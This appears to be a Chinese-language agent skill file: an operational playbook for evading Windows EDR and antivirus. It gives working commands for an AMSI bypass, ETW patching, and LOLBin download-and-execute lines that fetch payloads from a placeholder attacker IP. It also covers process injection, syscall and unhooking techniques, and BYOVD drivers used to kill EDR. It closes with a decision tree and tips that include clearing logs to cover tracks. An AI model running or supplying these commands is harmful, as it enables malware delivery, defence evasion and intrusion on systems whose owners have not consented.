---
name: 'edr-evasion'
description: 'EDR/AV 绕过 2026：LOTL→AMSI→ETW→进程注入→Direct Syscalls→BYOVD→内存加密。含工具和决策树。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---

# EDR/AV 绕过技术

> 🔴 **2026 年最活跃攻防领域。首选 LOTL，其次 Syscall，最后 BYOVD。**

## 0. 检测当前环境

```text
# 杀软/EDR 检测
tasklist | findstr /I "defender sentinel crowdstrike carbon cylance sophos trend mcafee symantec eset"
Get-MpComputerStatus | Select-Object *enabled*   # Defender 状态
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname

# AMSI 状态
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 确认绕过生效
Write-Host "AMSI Test"
```text

---

## 1. Living Off the Land (LOTL) 🔴 首选

> CISA 2025 官方指南。用系统自带二进制，不落盘。

```text
# 下载执行
certutil -urlcache -split -f http://IP/payload.exe C:\Windows\Temp\p.exe
bitsadmin /transfer job /download /priority high http://IP/payload C:\Windows\Temp\p.exe
curl http://IP/payload -o C:\Windows\Temp\p.exe
wget http://IP/payload -O C:\Windows\Temp\p.exe

# 代码执行（不落盘 DLL/JScript）
regsvr32 /s /n /u /i:http://IP/payload.sct scrobj.dll
mshta http://IP/payload.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";alert('test')

# 编译执行
msbuild C:\Windows\Temp\evil.csproj
csc.exe /out:C:\Windows\Temp\evil.exe C:\Windows\Temp\evil.cs

# PowerShell 无文件
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/evil.ps1')"
powershell -enc <base64_command>

# WMI 远程执行
wmic /node:IP /user:user /password:pass process call create "calc.exe"

# .NET InstallUtil
installutil /U C:\Windows\Temp\evil.dll  # 以 SYSTEM 执行 Uninstaller
```text

### LOLBins 完整列表参考
```text
LOLBAS Project: https://lolbas-project.github.io/
GTFOBins: https://gtfobins.github.io/ (Linux)
LOOBins: https://www.loobins.io/ (macOS)
```text

---

## 2. AMSI 绕过

```text
# PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patching (C/C++)
# → 找 amsi.dll!AmsiScanBuffer 地址 → WriteProcessMemory 写 ret (0xC3)

# PowerShell v2 降级 (⚠️ 需 .NET 2.0/3.5 — Win10+/Server 2016+ 默认不装)
powershell -version 2 -c "..."

# 混淆
"AMSI" → [char]65+[char]77+[char]83+[char]73
```text

---

## 3. ETW (Event Tracing for Windows) 绕过

```text
# PowerShell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)

# Patch EtwEventWrite 函数
# → ntdll.dll!EtwEventWrite → 写 ret (0xC3)
```text

---

## 4. 进程注入

```text
# 经典技术
[ ] CreateRemoteThread            # 最老但最稳定
[ ] Process Hollowing             # 挂起合法进程 → 替换内存 → 恢复
[ ] Process Doppelgänging         # NTFS 事务绕过文件扫描
[ ] Atom Bombing                  # 原子表写 shellcode
[ ] Early Bird APC Injection      # 进程创建时立即注入
[ ] Module Stomping               # 覆盖已加载 DLL 的 .text section
[ ] PPID Spoofing                 # 伪造父进程 (explorer.exe 而非恶意脚本)
    → STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

# 注入目标选择
白名单进程: notepad.exe / calc.exe / iexplore.exe / svchost.exe
签名进程:   Microsoft Edge / Teams / OneDrive
```text

---

## 5. Direct Syscalls & Indirect Syscalls 🔴 最有效

> 绕过用户态 hook。EDR hook 在 ntdll.dll 层失效。2025+ EDR 已能检测 Direct → 演进到 Indirect。

```text
# 原理
正常:     program → ntdll.dll (HOOKED) → syscall → kernel
Direct:   program → 直接 syscall → kernel  (syscall 来自 ntdll 外部 → ⚠️ 可检测)
Indirect: program → ntdll.dll (gadget) → syscall → kernel (syscall 地址在 ntdll 内 → 🟢)

# 工具: Direct
[ ] SysWhispers3   → 动态 syscall 获取
[ ] Hell's Gate    → 从 hooked ntdll 读 syscall 号
[ ] Halo's Gate    → 邻居启发式 (hooked 函数仍可读相邻 SSN)
[ ] RecycledGate   → 重用已有 syscall
[ ] TartarusGate   → 更隐蔽

# 工具: Indirect (syscall gadget 复用)
[ ] Perun's Fart   → 挂起进程提取干净 ntdll stub → 复制到当前进程
[ ] BouncyGate     → Indirect Syscalls (Nim) — jmp 到 ntdll 内 syscall
[ ] HWSyscalls     → HWBP + Indirect Syscall 组合

# optiv/Freeze → suspend process + direct syscalls + AES encryption
Freeze -I shellcode.bin -encrypt -O evil.exe
```text

---

## 6.5 🆕 API Unhooking (重载干净 ntdll)
```text
# 原理: EDR hook 存在于内存中的 ntdll.dll → 从磁盘读一份干净的 → 替换
# 不同于 syscall 绕过 — 恢复整个 DLL 的原始 .text section

# 步骤:
# 1. 从 \\?\C:\Windows\System32\ntdll.dll 读一份干净的 (磁盘版未被 hook)
# 2. 定位当前进程中 hooked ntdll (VirtualQuery → 找内存区域)
# 3. VirtualProtect → RW → 覆盖 .text → VirtualProtect → RX
#    → 之后所有 ntdll 调用都不再经过 EDR

# 工具: RefleXXion / SharpUnhooker / 手工 NtMapViewOfSection
```text

### 🆕 硬件断点 (HWBP / Blindside)
```text
# 利用 CPU 调试寄存器 (DR0-DR3) + DR7 设置硬件断点 — 内存本身零修改
# VEH (Vectored Exception Handler) + HWBP → 单步异常 → 改 RIP / unhook
# 绕过所有基于内存完整性扫描的检测 (无 hook、无 patch、无 .text 修改)
# 🔴 Cymulate "Blindside" 技术: hook LdrLoadDll → 阻止 EDR DLL 加载 → 干净进程
# 🔴 实战: 设 HWBP on NtOpenSection → VEH → 手工 map 恶意 PE → 执行
```text

---

## 7. DLL 侧加载 & 代理

```text
# 模式: 签名 EXE → 加载恶意 DLL
# 经典组合:
MpCmdRun.exe + MpClient.dll         # Defender 自身 + 伪造 DLL
OneDrive.exe + version.dll          # OneDrive 侧加载
Teams.exe + wkscli.dll
```text

---

## 7. BYOVD (Bring Your Own Vulnerable Driver) 🔴 2026 年爆炸增长

```text
# 原理: 加载签名但含漏洞的驱动 → 内核内存读写 → 终止 EDR 进程

# 著名武器化驱动
[ ] RTCore64.sys     (MSI Afterburner)
[ ] aswArPot.sys     (Avast)
[ ] procexp152.sys   (Process Explorer)
[ ] kprocesshacker.sys
[ ] ene.sys          (Huawei 音频)
[ ] GVCIDrv64.sys    (技嘉)

# 工具
[ ] BackStab      → 禁用 EDR 回调
[ ] EDRSandBlast  → 内核漏洞利用
[ ] Terminator    → BYOVD 一键杀 EDR

# 防御侧: 启用 HVCI + Microsoft Vulnerable Driver Blocklist
```text

---

## 8. 内存加密 & 阶段性加载

```text
# Lazy Loading
- 磁盘上的 payload: XOR/RC4/AES 加密 → 静态查杀失效
- 运行时解密 → 分配 RW 内存 → 解密 → 改 RX → 执行
- 用完立即 VirtualFree

# 远程 Staging
- 不把 payload 放本地
- SMB Staging (2025 新手法): payload → SMB 共享 → 远程读 → 内存执行

# Sleep Obfuscation
- Beacon sleep 时加密内存 + 堆栈欺骗
- 防止内存扫描抓到 C2 payload
```text

---

## 9. 实用工具

```text
# AV 检测触发点定位
ThreatCheck.exe -f payload.exe      # 二分定位哪段字节触发 AV

# AMSI patch 工具
Amsi-Killer.exe / PwnedPass.exe

# 免杀框架
[ ] Shellcode 生成:  msfvenom / Donut / ScareCrow
[ ] 加载器生成:      Freeze / Nimcrypt2 / Hoaxshell
[ ] 混淆:           ConfuserEx / Obfuscar / Invoke-Obfuscation
[ ] 打包:           PS2EXE / PyInstaller (但易被杀)

# Donut → shellcode 转 .NET/JS/VBS/PowerShell
donut -i original.exe -a 2 -o payload.bin
```text

---

## 10. 快速决策树

```text
有 PowerShell → AMSI Bypass → 无文件执行
有代码执行 → LOTL (certutil/bitsadmin/msbuild)
需要持久 beacon → Indirect Syscall + PPID Spoofing + 加密 + 进程注入
EDR 太强 → BYOVD (RTCore64) 终止 EDR → 后续操作
纯静默 → LOLBins 链 (每一步都用系统自带工具)
```text

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 上传 Mimikatz.exe 裸奔 | ✅ Syscall 注入 / LOLBins dump |
| ❌ 无脑 MSFVenom reverse_tcp | ✅ Donut + Freeze/Syscall 封装 |
| ❌ 所有 payload 用一样的模板 | ✅ 至少换 XOR 密钥和 syscall stub |
| ❌ Defender 静默就以为安全 | ✅ 同时 patch ETW 防日志 |
| ❌ BYOVD 不留痕迹 | ✅ 用完立即卸载驱动 + 清日志 |
